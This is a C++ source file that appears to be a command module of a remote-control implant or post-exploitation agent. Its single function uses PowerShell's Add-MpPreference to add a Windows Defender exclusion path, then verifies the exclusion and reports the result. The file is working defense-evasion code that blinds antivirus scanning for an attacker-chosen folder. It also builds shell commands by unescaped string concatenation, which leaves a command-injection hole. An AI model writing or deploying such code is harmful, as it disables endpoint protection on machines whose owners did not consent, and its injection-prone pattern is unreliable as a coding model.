#ifdef ENABLE_DEFENDER_EXCLUSION
#include "commands/DefenderExclusion.h"
#include "agents/Callback_utils.h"
#include <fstream>

namespace commands {
    bool AddDefenderExclusion(const std::string& path, std::string& statusContents) {
        if (!IsAdmin()) {
            statusContents = "Error: This operation requires administrative privileges.";
            return false;
        }

        try {
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            std::string tempFile = std::string(tempPath) + "defender_exclusion.txt";

            std::string cleanPath = path;
            if (!path.empty() && path.front() == '\'' && path.back() == '\'') {
                cleanPath = path.substr(1, path.length() - 2);
            }

            std::string command = "powershell -Command \"Add-MpPreference -ExclusionPath '" + cleanPath + "'\" > \"" + tempFile + "\" 2>&1";
            int result = system(command.c_str());

            if (result == 0) {
                statusContents = "Attempted to add exclusion path: '" + cleanPath + "'";

                std::string verifyCmd = "powershell -Command \"(Get-MpPreference).ExclusionPath -contains '" + cleanPath + "'\" > \"" + tempFile + "\" 2>&1";
                system(verifyCmd.c_str());

                std::ifstream file(tempFile);
                if (file.is_open()) {
                    std::string line;
                    std::getline(file, line);
                    line.erase(0, line.find_first_not_of(" \t\r\n"));
                    line.erase(line.find_last_not_of(" \t\r\n") + 1);
                    statusContents += "\nVerification: " + line;
                    file.close();
                }
            }
            else {
                std::ifstream file(tempFile);
                if (file.is_open()) {
                    std::string line;
                    while (std::getline(file, line)) {
                        statusContents += "\nError: " + line;
                    }
                    file.close();
                }
            }

            system(("del \"" + tempFile + "\"").c_str());

            return result == 0;
        }
        catch (const std::exception& e) {
            statusContents = "Exception: " + std::string(e.what());
            return false;
        }
    }
}
#endif